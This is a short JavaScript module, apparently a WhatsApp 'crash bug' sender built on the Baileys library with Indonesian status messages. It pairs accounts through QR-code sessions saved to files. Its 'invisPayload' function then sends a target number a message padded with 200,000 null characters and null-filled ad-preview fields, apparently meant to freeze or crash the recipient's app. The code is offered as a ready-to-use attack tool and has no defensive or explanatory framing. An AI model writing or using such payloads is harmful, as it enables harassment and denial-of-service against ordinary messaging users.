const { makeWASocket, useSingleFileAuthState } = require('@whiskeysockets/baileys');
const fs = require('fs');

const sessionsDir = './sessions';
if (!fs.existsSync(sessionsDir)) fs.mkdirSync(sessionsDir);

const clients = {};

async function createConnection(nomor) {
  const sessionPath = `${sessionsDir}/${nomor}.json`;
  const { state, saveState } = useSingleFileAuthState(sessionPath);

  const sock = makeWASocket({
    auth: state,
    printQRInTerminal: true
  });

  sock.ev.on('creds.update', saveState);
  clients[nomor] = sock;

  return sock;
}

async function startPairing(nomor) {
  const sessionPath = `${sessionsDir}/${nomor}.json`;
  if (fs.existsSync(sessionPath)) {
    return '✅ Sudah dipair sebelumnya.';
  }

  const sock = await createConnection(nomor);
  return '📲 Scan QR Code di terminal untuk nomor ini.';
}

async function invisPayload(nomor) {
  const sock = clients[nomor] || await createConnection(nomor);
  const target = nomor + '@s.whatsapp.net';

  const nullChar = '\u0000';
  const message = {
    text: nullChar.repeat(200000),
    contextInfo: {
      mentionedJid: [target],
      externalAdReply: {
        showAdAttribution: true,
        title: nullChar.repeat(10000),
        body: nullChar.repeat(10000),
        previewType: "PHOTO",
        mediaType: 1,
        thumbnail: Buffer.from(nullChar.repeat(10000)),
        sourceUrl: "https://wa.me/"
      }
    }
  };

  await sock.sendMessage(target, message);
}

module.exports = { startPairing, invisPayload };
